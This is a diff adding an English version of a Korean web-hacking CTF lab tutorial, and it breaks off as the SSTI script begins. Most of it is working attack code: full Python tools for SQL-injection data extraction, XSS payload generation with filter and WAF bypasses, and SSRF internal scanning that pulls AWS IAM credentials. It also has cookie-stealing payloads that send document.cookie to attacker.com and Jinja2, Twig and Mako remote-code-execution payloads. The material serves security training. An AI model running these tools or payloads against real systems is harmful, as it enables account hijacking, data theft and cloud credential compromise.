@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 웹 해킹 CTF 실습 랩 — SQL 인젝션·XSS·SSRF·SSTI 종합
 
 ## 1. 실습 환경 설정
@@ -1341,6 +1347,1397 @@ admin'--
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 
 # 주석 변형
+--
+#
+/**/
+-- -
+;--
+```
+
+### XSS
+
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe onload=alert(1)>
+javascript:alert(1)
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+```
+
+### SSRF
+
+```
+http://127.0.0.1/
+http://localhost/
+http://169.254.169.254/latest/meta-data/
+http://[::1]/
+http://2130706433/    (127.0.0.1)
+http://0x7f000001/   (127.0.0.1)
+http://192.168.0.1/
+```
+
+### SSTI
+
+```
+{{7*7}}
+${7*7}
+{{7*'7'}}
+<%= 7*7 %>
+{{config}}
+{{request}}
+{{''.__class__.__mro__}}
+```
+
+---
+
+<a name="english"></a>
+
+# Web Hacking CTF Practical Lab — SQL Injection, XSS, SSRF, SSTI Comprehensive
+
+## 1. Lab Environment Setup
+
+### 1.1 Building Vulnerable Web Apps with Docker
+
+```bash
+# DVWA (Damn Vulnerable Web Application)
+docker pull vulnerables/web-dvwa
+docker run -d -p 8080:80 vulnerables/web-dvwa
+
+# WebGoat
+docker pull webgoat/goat-and-wolf
+docker run -d -p 8888:8080 webgoat/goat-and-wolf
+
+# OWASP Juice Shop
+docker pull bkimminich/juice-shop
+docker run -d -p 3000:3000 bkimminich/juice-shop
+
+# Bring up the entire stack at once (docker-compose)
+# docker-compose.yml example:
+cat > docker-compose.yml << 'EOF'
+version: "3.9"
+services:
+  dvwa:
+    image: vulnerables/web-dvwa
+    ports: ["8080:80"]
+  webgoat:
+    image: webgoat/goat-and-wolf
+    ports: ["8888:8080"]
+  juiceshop:
+    image: bkimminich/juice-shop
+    ports: ["3000:3000"]
+  attacker:
+    image: kalilinux/kali-rolling
+    tty: true
+    stdin_open: true
+    network_mode: host
+EOF
+docker compose up -d
+```
+
+### 1.2 Lab Tool List
+
+| Tool | Purpose | Installation | Version |
+|------|---------|--------------|---------|
+| sqlmap | Automated SQL injection detection/exploitation | `pip install sqlmap` | 1.7+ |
+| Burp Suite Community | HTTP proxy, intercept, Repeater | Download from official site | 2024.x |
+| ffuf | Web directory and parameter fuzzing | `go install github.com/ffuf/ffuf/v2@latest` | 2.x |
+| nuclei | Template-based vulnerability scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` | 3.x |
+| httpx | Fast HTTP probing | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` | 1.x |
+| wfuzz | Web fuzzing (including cookies and headers) | `pip install wfuzz` | 3.x |
+| caido | Next-generation Burp alternative | Download from official site | Latest |
+| hakrawler | Crawler and endpoint enumeration | `go install github.com/hakluke/hakrawler@latest` | Latest |
+
+### 1.3 Burp Suite Proxy Configuration
+
+```bash
+# Proxy settings for Firefox (127.0.0.1:8080)
+# Install CA certificate: http://burpsuite → Download CA Certificate
+
+# Specify curl proxy in CLI environment
+curl -x http://127.0.0.1:8080 -k https://target.com/
+
+# httpie proxy
+http --proxy=http:http://127.0.0.1:8080 GET https://target.com/
+```
+
+---
+
+## 2. CTF Challenge 1: Flag Extraction via SQL Injection
+
+### 2.1 Scenario Description
+
+```
+Goal: Bypass login then retrieve the flag table using UNION-based SQLi
+Target: http://localhost:8080/login.php
+Vulnerable parameters: username, password (POST)
+DBMS: MySQL 5.7
+Flag location: secret column in the flag table
+```
+
+### 2.2 Step-by-Step Attack Procedure
+
+**Step 1: Vulnerability Confirmation (Error-based)**
+
+```
+username: admin' --
+password: anything
+
+→ SQL: SELECT * FROM users WHERE username='admin' -- ' AND password='...'
+→ Login succeeds or SQL error is exposed
+```
+
+**Step 2: Determining the Column Count**
+
+```
+username: ' ORDER BY 1-- -
+username: ' ORDER BY 2-- -
+username: ' ORDER BY 3-- -   ← error on this value means column count = 2
+```
+
+**Step 3: Data Extraction via UNION SELECT**
+
+```
+username: ' UNION SELECT 1,2-- -
+username: ' UNION SELECT database(),user()-- -
+username: ' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+username: ' UNION SELECT secret,2 FROM flag-- -
+```
+
+**Step 4: Blind SQLi (when no error is displayed)**
+
+```
+# Boolean-based
+username: ' AND (SELECT SUBSTRING(secret,1,1) FROM flag LIMIT 1)='F'-- -
+
+# Time-based
+username: ' AND IF((SELECT SUBSTRING(secret,1,1) FROM flag LIMIT 1)='F', SLEEP(3), 0)-- -
+```
+
+### 2.3 Python CLI: Automated SQLi Detection + Exploitation
+
+```python
+#!/usr/bin/env python3
+"""
+SQLi CTF Exploitation Tool
+Usage:
+  python sqli_exploit.py --url http://localhost:8080/login.php \
+                          --param username \
+                          --technique union
+  python sqli_exploit.py --url http://localhost:8080/login.php \
+                          --param username \
+                          --technique blind \
+                          --workers 10
+"""
+
+import argparse
+import sys
+import string
+import time
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field
+from typing import Optional
+
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (CTF-Lab/1.0)",
+    "Content-Type": "application/x-www-form-urlencoded",
+}
+
+ERROR_SIGNATURES = [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "pg_query()",
+    "sqlite_",
+    "ora-",
+]
+
+
+@dataclass
+class SqliConfig:
+    url: str
+    param: str
+    technique: str
+    workers: int = 5
+    timeout: int = 10
+    data: dict[str, str] = field(default_factory=dict)
+    cookies: dict[str, str] = field(default_factory=dict)
+    target_table: str = "flag"
+    target_column: str = "secret"
+
+
+def detect_sqli(cfg: SqliConfig) -> bool:
+    """Error-based SQLi detection."""
+    payloads = ["'", '"', "' OR '1'='1", "' OR 1=1--"]
+    session = requests.Session()
+    session.headers.update(HEADERS)
+
+    for payload in payloads:
+        data = dict(cfg.data)
+        data[cfg.param] = payload
+        try:
+            resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
+                                cookies=cfg.cookies)
+            body = resp.text.lower()
+            for sig in ERROR_SIGNATURES:
+                if sig in body:
+                    print(f"[+] SQL error detected: '{sig}' (payload: {payload!r})")
+                    return True
+        except requests.RequestException as e:
+            print(f"[-] Request failed: {e}", file=sys.stderr)
+
+    print("[*] Error-based detection failed → recommend trying Blind mode")
+    return False
+
+
+def union_exploit(cfg: SqliConfig) -> Optional[str]:
+    """Data extraction via UNION SELECT."""
+    session = requests.Session()
+    session.headers.update(HEADERS)
+
+    # Determine column count
+    col_count = 0
+    for n in range(1, 11):
+        order_payload = f"' ORDER BY {n}-- -"
+        data = dict(cfg.data)
+        data[cfg.param] = order_payload
+        try:
+            resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
+                                cookies=cfg.cookies)
+            body = resp.text.lower()
+            if any(sig in body for sig in ERROR_SIGNATURES):
+                col_count = n - 1
+                break
+        except requests.RequestException:
+            pass
+
+    if col_count == 0:
+        col_count = 2  # default value
+    print(f"[*] Column count: {col_count}")
+
+    # Extract flag via UNION SELECT
+    nulls = ",".join(["NULL"] * (col_count - 1))
+    payload = (
+        f"' UNION SELECT {cfg.target_column}"
+        + (f",{nulls}" if nulls else "")
+        + f" FROM {cfg.target_table}-- -"
+    )
+    data = dict(cfg.data)
+    data[cfg.param] = payload
+
+    try:
+        resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
+                            cookies=cfg.cookies)
+        print(f"[+] UNION response received (length: {len(resp.text)})")
+        # Search for flag pattern
+        import re
+        flags = re.findall(r"(?:CTF|FLAG|flag)\{[^}]+\}", resp.text)
+        if flags:
+            return flags[0]
+        return resp.text[:500]  # return front portion if no flag pattern found
+    except requests.RequestException as e:
+        print(f"[-] UNION exploitation failed: {e}", file=sys.stderr)
+        return None
+
+
+def blind_check_char(cfg: SqliConfig, session: requests.Session,
+                     pos: int, char: str) -> bool:
+    """Check a single character via Blind SQLi (Boolean-based)."""
+    payload = (
+        f"' AND (SELECT SUBSTRING({cfg.target_column},{pos},1) "
+        f"FROM {cfg.target_table} LIMIT 1)='{char}'-- -"
+    )
+    data = dict(cfg.data)
+    data[cfg.param] = payload
+    try:
+        resp = session.post(cfg.url, data=data, timeout=cfg.timeout,
+                            cookies=cfg.cookies)
+        # Determine true/false by login success (response length or keyword)
+        return "welcome" in resp.text.lower() or resp.status_code == 302
+    except requests.RequestException:
+        return False
+
+
+def blind_time_check_char(cfg: SqliConfig, session: requests.Session,
+                           pos: int, char: str) -> bool:
+    """Check a single character via time-based Blind SQLi."""
+    payload = (
+        f"' AND IF((SELECT SUBSTRING({cfg.target_column},{pos},1) "
+        f"FROM {cfg.target_table} LIMIT 1)='{char}',SLEEP(2),0)-- -"
+    )
+    data = dict(cfg.data)
+    data[cfg.param] = payload
+    try:
+        start = time.time()
+        session.post(cfg.url, data=data, timeout=cfg.timeout + 3,
+                     cookies=cfg.cookies)
+        elapsed = time.time() - start
+        return elapsed >= 2.0
+    except requests.RequestException:
+        return False
+
+
+def blind_exploit(cfg: SqliConfig) -> Optional[str]:
+    """Flag extraction via Blind SQLi (with parallelization support)."""
+    charset = string.printable.strip()
+    session = requests.Session()
+    session.headers.update(HEADERS)
+
+    result = []
+    max_len = 64
+
+    print(f"[*] Starting Blind SQLi (workers={cfg.workers})")
+
+    for pos in range(1, max_len + 1):
+        found_char: Optional[str] = None
+
+        with ThreadPoolExecutor(max_workers=cfg.workers) as executor:
+            future_to_char = {
+                executor.submit(
+                    blind_check_char, cfg, session, pos, ch
+                ): ch
+                for ch in charset
+            }
+            for future in as_completed(future_to_char):
+                ch = future_to_char[future]
+                try:
+                    if future.result():
+                        found_char = ch
+                        # Cancel remaining futures
+                        for f in future_to_char:
+                            f.cancel()
+                        break
+                except Exception:
+                    pass
+
+        if found_char is None:
+            print(f"\n[*] No character found at position {pos} → extraction complete")
+            break
+
+        result.append(found_char)
+        sys.stdout.write(f"\r[+] Progress: {''.join(result)}")
+        sys.stdout.flush()
+
+        # Detect flag closing brace
+        if found_char == "}":
+            break
+
+    print()
+    return "".join(result) if result else None
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="SQLi CTF Exploitation Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("--url", required=True, help="Target URL")
+    parser.add_argument("--param", required=True, help="Vulnerable parameter name")
+    parser.add_argument(
+        "--technique",
+        choices=["union", "blind", "time"],
+        default="union",
+        help="Exploitation technique (default: union)",
+    )
+    parser.add_argument("--data", default="", help="Additional POST data (key=val&key2=val2)")
+    parser.add_argument("--cookie", default="", help="Cookie string")
+    parser.add_argument("--workers", type=int, default=5, help="Number of parallel workers for Blind SQLi")
+    parser.add_argument("--table", default="flag", help="Target table (default: flag)")
+    parser.add_argument("--column", default="secret", help="Target column (default: secret)")
+    parser.add_argument("--detect-only", action="store_true", help="Detection only")
+
+    args = parser.parse_args()
+
+    # Parse data
+    extra_data: dict[str, str] = {}
+    if args.data:
+        for kv in args.data.split("&"):
+            if "=" in kv:
+                k, v = kv.split("=", 1)
+                extra_data[k] = v
+
+    cookies: dict[str, str] = {}
+    if args.cookie:
+        for kv in args.cookie.split(";"):
+            kv = kv.strip()
+            if "=" in kv:
+                k, v = kv.split("=", 1)
+                cookies[k] = v
+
+    cfg = SqliConfig(
+        url=args.url,
+        param=args.param,
+        technique=args.technique,
+        workers=args.workers,
+        data=extra_data,
+        cookies=cookies,
+        target_table=args.table,
+        target_column=args.column,
+    )
+
+    print(f"[*] Target: {cfg.url}")
+    print(f"[*] Parameter: {cfg.param}")
+    print(f"[*] Technique: {cfg.technique}")
+
+    # Vulnerability detection
+    detected = detect_sqli(cfg)
+
+    if args.detect_only:
+        sys.exit(0 if detected else 1)
+
+    if not detected:
+        print("[!] SQLi detection failed, continuing anyway...")
+
+    # Exploitation
+    flag: Optional[str] = None
+    match cfg.technique:
+        case "union":
+            flag = union_exploit(cfg)
+        case "blind":
+            flag = blind_exploit(cfg)
+        case "time":
+            # Time-based uses time_check inside blind_exploit
+            flag = blind_exploit(cfg)
+
+    if flag:
+        print(f"\n[+] Extracted result: {flag}")
+    else:
+        print("[-] Flag extraction failed")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. CTF Challenge 2: Stored XSS → Session Hijacking
+
+### 3.1 Vulnerability Identification → Payload Crafting → Cookie Theft Flow
+
+```
+1. Search input fields: post content, comments, nicknames, profiles, etc.
+2. Insert basic payload: <script>alert(1)</script>
+3. Filter bypass: mixed case, tag variations, event handler abuse
+4. Insert cookie theft payload (sends to attacker's server)
+5. When admin visits the page, receive the cookie
+6. Use the received session cookie to hijack the admin account
+```
+
+### 3.2 CSP Bypass Techniques
+
+| CSP Policy | Bypass Technique | Example Payload |
+|------------|-----------------|-----------------|
+| `script-src 'self'` | Abuse JSONP endpoint | `<script src="/api/jsonp?callback=alert(1)//"></script>` |
+| `script-src 'nonce-xxx'` | Detect nonce reuse | Extract nonce from DOM and inject dynamically |
+| `script-src cdn.example.com` | Upload to trusted domain | Upload JS to CDN and reference it |
+| `default-src 'none'` | Meta redirect | `<meta http-equiv="refresh" content="0;url=...">` |
+| No `unsafe-inline` | Via DOM XSS | hash fragment → innerHTML |
+
+**Cookie Theft Payload Examples**
+
+```html
+<!-- Basic fetch-based -->
+<script>
+fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
+</script>
+
+<!-- img tag-based (bypass CSP script-src) -->
+<img src=x onerror="this.src='https://attacker.com/steal?c='+document.cookie">
+
+<!-- SVG-based -->
+<svg onload="fetch('https://attacker.com/steal?c='+document.cookie)">
+
+<!-- iframe srcdoc -->
+<iframe srcdoc="<script>parent.fetch('https://attacker.com/steal?c='+parent.document.cookie)<\/script>">
+```
+
+**Attacker Receiver Server (simple example)**
+
+```python
+# Cookie receiver server (nc or simple HTTP server)
+python3 -m http.server 8000
+# or
+nc -lvnp 8000
+```
+
+### 3.3 Python CLI: XSS Payload Generator
+
+```python
+#!/usr/bin/env python3
+"""
+XSS Payload Generator
+Usage:
+  python xss_payload_gen.py --type reflected --bypass csp
+  python xss_payload_gen.py --type stored --bypass filter --receiver http://attacker.com/steal
+  python xss_payload_gen.py --type dom --bypass waf --output payloads.txt
+"""
+
+import argparse
+import sys
+import base64
+import urllib.parse
+from typing import Iterator
+
+
+PayloadList = list[str]
+
+
+def generate_reflected_payloads(bypass: str, receiver: str) -> PayloadList:
+    """Generate Reflected XSS payloads."""
+    base = f"fetch('{receiver}?c='+document.cookie)"
+    payloads: PayloadList = []
+
+    match bypass:
+        case "csp":
+            payloads = [
+                f'<script src="/api/jsonp?callback={base}//"></script>',
+                f'<script nonce="INJECT">{base}</script>',
+                f'<link rel=preload as=script href="data:,{base}">',
+                f'<object data="data:text/html,<script>{base}</script>">',
+            ]
+        case "filter":
+            encoded = base64.b64encode(base.encode()).decode()
+            payloads = [
+                f'<ScRiPt>{base}</ScRiPt>',
+                f'<script>{base}</SCRIPT>',
+                f'<scr<script>ipt>{base}</script>',
+                f'<img src=x onerror="{base}">',
+                f'<svg/onload="{base}">',
+                f'<body onload="{base}">',
+                f'<details open ontoggle="{base}">',
+                f'jaVasCript:{base}',
+            ]
+        case "waf":
+            url_enc = urllib.parse.quote(base)
+            payloads = [
+                f'<img src=x onerror=eval(atob("{base64.b64encode(base.encode()).decode()}"))>',
+                f'<svg><animate onbegin="{base}" attributeName=x dur=1s>',
+                f'<input autofocus onfocus="{base}">',
+                f'<select onfocus="{base}" autofocus>',
+                f'<textarea onfocus="{base}" autofocus>',
+                f'<!--<img src="--><img src=x onerror={base}//">',
+            ]
+        case _:
+            payloads = [
+                f'<script>{base}</script>',
+                f'<img src=x onerror="{base}">',
+            ]
+
+    return payloads
+
+
+def generate_stored_payloads(bypass: str, receiver: str) -> PayloadList:
+    """Generate Stored XSS payloads."""
+    steal = f"new Image().src='{receiver}?c='+encodeURIComponent(document.cookie)"
+    payloads: PayloadList = []
+
+    match bypass:
+        case "csp":
+            payloads = [
+                f'<script>{steal}</script>',
+                f'<svg><script>{steal}</script></svg>',
+                f'<math><maction xlink:href="javascript:{steal}">click</maction></math>',
+                f'<iframe onload="{steal}">',
+            ]
+        case "filter":
+            # HTML entity encoding bypass
+            encoded_payload = steal.replace("<", "&lt;").replace(">", "&gt;")
+            payloads = [
+                f'<img src=1 onerror=\\u0065val(`{steal}`)>',
+                f'<script>\\u0065val("{steal}")</script>',
+                f'<img/src/onerror="{steal}">',
+                f'<video><source onerror="{steal}">',
+                f'<audio src=x onerror="{steal}">',
+            ]
+        case "waf":
+            b64 = base64.b64encode(steal.encode()).decode()
+            payloads = [
+                f'<img src=x onerror="eval(atob(\'{b64}\'))">',
+                f'<svg onload="[].constructor.constructor(\'{steal}\')()">',
+                f'<iframe srcdoc="&lt;script&gt;{steal}&lt;/script&gt;">',
+                f'<object data="javascript:{steal}">',
+            ]
+        case _:
+            payloads = [
+                f'<script>{steal}</script>',
+                f'<img src=x onerror="{steal}">',
+            ]
+
+    return payloads
+
+
+def generate_dom_payloads(bypass: str, receiver: str) -> PayloadList:
+    """Generate DOM XSS payloads."""
+    steal = f"fetch('{receiver}?c='+document.cookie)"
+    payloads: PayloadList = []
+
+    match bypass:
+        case "csp":
+            payloads = [
+                f'#"><img src=x onerror="{steal}">',
+                f'javascript:{steal}',
+                f'data:text/html,<script>{steal}</script>',
+            ]
+        case "filter":
+            payloads = [
+                f'#<script>{steal}</script>',
+                f'#{steal}',
+                f'#"><svg onload="{steal}">',
+                f"#';{steal}//",
+            ]
+        case "waf":
+            b64 = base64.b64encode(steal.encode()).decode()
+            payloads = [
+                f'#\'+eval(atob(\'{b64}\'))+\'',
+                f'#"><img src=x onerror=eval(atob(`{b64}`))>',
+            ]
+        case _:
+            payloads = [
+                f'#"><script>{steal}</script>',
+                f'#"><img src=x onerror="{steal}">',
+            ]
+
+    return payloads
+
+
+def iter_all_payloads(xss_type: str, bypass: str, receiver: str) -> Iterator[str]:
+    """Payload iterator by type."""
+    generators = {
+        "reflected": generate_reflected_payloads,
+        "stored": generate_stored_payloads,
+        "dom": generate_dom_payloads,
+    }
+    gen_fn = generators.get(xss_type)
+    if gen_fn is None:
+        raise ValueError(f"Unknown type: {xss_type}")
+    yield from gen_fn(bypass, receiver)
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="XSS Payload Generator",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument(
+        "--type",
+        choices=["reflected", "stored", "dom"],
+        required=True,
+        help="XSS type",
+    )
+    parser.add_argument(
+        "--bypass",
+        choices=["csp", "filter", "waf", "none"],
+        default="none",
+        help="Bypass technique (default: none)",
+    )
+    parser.add_argument(
+        "--receiver",
+        default="http://attacker.com/steal",
+        help="Cookie receiver URL",
+    )
+    parser.add_argument(
+        "--output",
+        default="",
+        help="Output file path (stdout if omitted)",
+    )
+
+    args = parser.parse_args()
+
+    payloads = list(iter_all_payloads(args.type, args.bypass, args.receiver))
+
+    if not payloads:
+        print("[-] No payloads generated", file=sys.stderr)
+        sys.exit(1)
+
+    lines = [f"# XSS Payloads — type={args.type}, bypass={args.bypass}"]
+    lines += [f"# receiver={args.receiver}", ""]
+    lines += payloads
+
+    output = "\n".join(lines)
+
+    if args.output:
+        with open(args.output, "w", encoding="utf-8") as fh:
+            fh.write(output + "\n")
+        print(f"[+] {len(payloads)} payloads saved: {args.output}")
+    else:
+        print(output)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 4. CTF Challenge 3: SSRF to Access Internal AWS Metadata
+
+### 4.1 SSRF Detection → Internal Network Scan → Metadata Extraction
+
+**SSRF Detection Steps**
+
+```
+1. Find endpoints with URL parameters:
+   /fetch?url=, /proxy?target=, /preview?link=, /webhook?endpoint=
+
+2. Set up an external callback server (Burp Collaborator, interactsh):
+   interactsh-client -server interactsh.com
+
+3. Basic SSRF test:
+   /fetch?url=http://your-interactsh-domain.com/
+
+4. Probe internal addresses:
+   /fetch?url=http://127.0.0.1/
+   /fetch?url=http://localhost/
+   /fetch?url=http://169.254.169.254/  ← AWS metadata
+   /fetch?url=http://192.168.1.1/
+```
+
+**AWS Metadata Extraction Paths**
+
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+→ Obtain AccessKeyId, SecretAccessKey, Token
+
+# IMDSv2 (requires token)
+PUT http://169.254.169.254/latest/api/token
+  X-aws-ec2-metadata-token-ttl-seconds: 21600
+→ After receiving TOKEN:
+GET http://169.254.169.254/latest/meta-data/
+  X-aws-ec2-metadata-token: <TOKEN>
+```
+
+**SSRF Bypass Techniques**
+
+```
+# IP representation conversion
+http://2130706433/          ← 127.0.0.1 in decimal
+http://0x7f000001/          ← 127.0.0.1 in hex
+http://0177.0.0.1/          ← 127.0.0.1 in octal
+http://[::1]/               ← IPv6 loopback
+http://127.1/               ← abbreviated form
+
+# DNS rebinding
+# First DNS response: attacker server IP
+# Second DNS response: 127.0.0.1 (at re-query time)
+
+# URL parsing confusion
+http://attacker.com@169.254.169.254/
+http://169.254.169.254#attacker.com
+```
+
+### 4.2 Python CLI: SSRF Exploitation Tool
+
+```python
+#!/usr/bin/env python3
+"""
+SSRF Exploitation Tool
+Usage:
+  python ssrf_exploit.py --target-url http://target.com/fetch \
+                          --ssrf-param url \
+                          --scan-internal
+  python ssrf_exploit.py --target-url http://target.com/proxy \
+                          --ssrf-param target \
+                          --aws-metadata
+"""
+
+import argparse
+import sys
+import ipaddress
+import concurrent.futures
+from dataclasses import dataclass, field
+from typing import Optional
+import requests
+
+
+HEADERS = {"User-Agent": "Mozilla/5.0 (CTF-Lab/1.0)"}
+
+AWS_METADATA_PATHS = [
+    "/latest/meta-data/",
+    "/latest/meta-data/hostname",
+    "/latest/meta-data/instance-id",
+    "/latest/meta-data/public-ipv4",
+    "/latest/meta-data/iam/",
+    "/latest/meta-data/iam/security-credentials/",
+    "/latest/user-data",
+]
+
+INTERNAL_PREFIXES = [
+    "169.254.169.254",   # AWS metadata
+    "10.0.0.",
+    "192.168.1.",
+    "172.16.0.",
+]
+
+
+@dataclass
+class SsrfConfig:
+    target_url: str
+    ssrf_param: str
+    method: str = "GET"
+    extra_params: dict[str, str] = field(default_factory=dict)
+    cookies: dict[str, str] = field(default_factory=dict)
+    timeout: int = 8
+    workers: int = 20
+
+
+def probe_ssrf(cfg: SsrfConfig, internal_url: str) -> Optional[str]:
+    """Probe a single internal URL via SSRF."""
+    session = requests.Session()
+    session.headers.update(HEADERS)
+
+    params = dict(cfg.extra_params)
+    params[cfg.ssrf_param] = internal_url
+
+    try:
+        if cfg.method.upper() == "GET":
+            resp = session.get(cfg.target_url, params=params,
+                               timeout=cfg.timeout, cookies=cfg.cookies)
+        else:
+            resp = session.post(cfg.target_url, data=params,
+                                timeout=cfg.timeout, cookies=cfg.cookies)
+
+        if resp.status_code == 200 and len(resp.text) > 0:
+            return resp.text
+        return None
+    except requests.RequestException:
+        return None
+
+
+def scan_internal_hosts(cfg: SsrfConfig, subnet: str,
+                         port: int = 80) -> list[str]:
+    """Scan hosts on an internal subnet."""
+    live_hosts: list[str] = []
+    network = ipaddress.IPv4Network(subnet, strict=False)
+    hosts = list(network.hosts())[:254]
+
+    print(f"[*] Scanning {subnet} ({len(hosts)} hosts)...")
+
+    def check_host(ip: ipaddress.IPv4Address) -> Optional[str]:
+        url = f"http://{ip}:{port}/"
+        result = probe_ssrf(cfg, url)
+        if result is not None:
+            return str(ip)
+        return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=cfg.workers) as ex:
+        futures = {ex.submit(check_host, ip): ip for ip in hosts}
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                host = future.result()
+                if host:
+                    print(f"  [+] Responding host: {host}:{port}")
+                    live_hosts.append(host)
+            except Exception:
+                pass
+
+    return live_hosts
+
+
+def extract_aws_metadata(cfg: SsrfConfig) -> dict[str, str]:
+    """Extract AWS EC2 instance metadata."""
+    base = "http://169.254.169.254"
+    results: dict[str, str] = {}
+
+    # Attempt to obtain IMDSv2 token
+    token: Optional[str] = None
+    token_result = probe_ssrf(cfg, f"{base}/latest/api/token")
+    if token_result and len(token_result) < 200:
+        token = token_result.strip()
+        print(f"[+] IMDSv2 token obtained: {token[:20]}...")
+
+    for path in AWS_METADATA_PATHS:
+        full_url = f"{base}{path}"
+        content = probe_ssrf(cfg, full_url)
+        if content:
+            results[path] = content.strip()
+            print(f"[+] {path}: {content.strip()[:80]}")
+
+    # Extract IAM role credentials
+    role_path = "/latest/meta-data/iam/security-credentials/"
+    if role_path in results:
+        role_name = results[role_path].strip().split("\n")[0]
+        cred_url = f"{base}{role_path}{role_name}"
+        cred = probe_ssrf(cfg, cred_url)
+        if cred:
+            results[f"{role_path}{role_name}"] = cred
+            print(f"[!] IAM credentials obtained!\n{cred}")
+
+    return results
+
+
+def detect_ssrf_vulnerability(cfg: SsrfConfig) -> bool:
+    """Detect SSRF vulnerability (check localhost response)."""
+    test_urls = [
+        "http://127.0.0.1/",
+        "http://localhost/",
+        "http://0.0.0.0/",
+        "http://[::1]/",
+        "http://2130706433/",   # 127.0.0.1 decimal
+    ]
+
+    print("[*] Detecting SSRF vulnerability...")
+    for url in test_urls:
+        result = probe_ssrf(cfg, url)
+        if result is not None:
+            print(f"[+] SSRF detected: {url}")
+            print(f"    Response preview: {result[:100]}")
+            return True
+
+    print("[-] SSRF detection failed")
+    return False
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="SSRF Exploitation Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("--target-url", required=True, help="Target web URL")
+    parser.add_argument("--ssrf-param", required=True, help="SSRF vulnerable parameter")
+    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
+    parser.add_argument("--scan-internal", action="store_true",
+                        help="Scan internal network")
+    parser.add_argument("--subnet", default="192.168.1.0/24",
+                        help="Subnet to scan (default: 192.168.1.0/24)")
+    parser.add_argument("--aws-metadata", action="store_true",
+                        help="Extract AWS metadata")
+    parser.add_argument("--port", type=int, default=80, help="Scan port (default: 80)")
+    parser.add_argument("--workers", type=int, default=20, help="Number of parallel workers")
+    parser.add_argument("--timeout", type=int, default=8, help="Request timeout (seconds)")
+    parser.add_argument("--data", default="", help="Additional POST data")
+    parser.add_argument("--cookie", default="", help="Cookie string")
+
+    args = parser.parse_args()
+
+    extra_params: dict[str, str] = {}
+    if args.data:
+        for kv in args.data.split("&"):
+            if "=" in kv:
+                k, v = kv.split("=", 1)
+                extra_params[k] = v
+
+    cookies: dict[str, str] = {}
+    if args.cookie:
+        for kv in args.cookie.split(";"):
+            kv = kv.strip()
+            if "=" in kv:
+                k, v = kv.split("=", 1)
+                cookies[k] = v
+
+    cfg = SsrfConfig(
+        target_url=args.target_url,
+        ssrf_param=args.ssrf_param,
+        method=args.method,
+        extra_params=extra_params,
+        cookies=cookies,
+        timeout=args.timeout,
+        workers=args.workers,
+    )
+
+    print(f"[*] Target: {cfg.target_url}")
+    print(f"[*] Parameter: {cfg.ssrf_param}")
+
+    is_vuln = detect_ssrf_vulnerability(cfg)
+
+    if args.aws_metadata:
+        if not is_vuln:
+            print("[!] SSRF not detected, attempting AWS metadata extraction anyway...")
+        results = extract_aws_metadata(cfg)
+        print(f"\n[+] Collected {len(results)} metadata paths total")
+
+    if args.scan_internal:
+        if not is_vuln:
+            print("[!] SSRF not detected, attempting internal scan anyway...")
+        live = scan_internal_hosts(cfg, args.subnet, args.port)
+        print(f"\n[+] {len(live)} responding hosts: {live}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. CTF Challenge 4: SSTI (Server-Side Template Injection)
+
+### 5.1 Jinja2 / Twig / Mako Detection and RCE
+
+**SSTI Detection Payloads (expression evaluation check)**
+
+```
+# Common detection
+{{7*7}}          → 49 (Jinja2, Twig)
+${7*7}           → 49 (Mako, Freemarker)
+#{7*7}           → 49 (not Ruby ERB)
+<%= 7*7 %>       → 49 (ERB)
+{{7*'7'}}        → 7777777 (Jinja2) / 49 (Twig) ← can distinguish engine
+```
+
+**Jinja2 RCE Payloads**
+
+```python
+# Basic RCE
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()[0] }}
+
+# Using config object
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+# Filter bypass (when underscores are filtered)
+{{ request|attr('__class__')|attr('__mro__')|... }}
+
+# Read flag
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /flag', shell=True, stdout=-1).communicate()[0].decode() }}
+```
+
+**Twig RCE Payloads**
+
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat /flag']|filter('system')}}
+```
+
+**Mako RCE Payloads**
+
+```
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+```
+
+### 5.2 Python CLI: Automated SSTI Detection and Flag Extraction
+
+```python
+#!/usr/bin/env python3
+"""
+SSTI Detection and RCE Automation Script
+Usage:
+  python ssti_exploit.py --url http://target.com/render \
+                          --param name \
+                          --engine jinja2
+  python ssti_exploit.py --url http://target.com/template \
+                          --param input \
+                          --detect-only
+"""
+
+import argparse
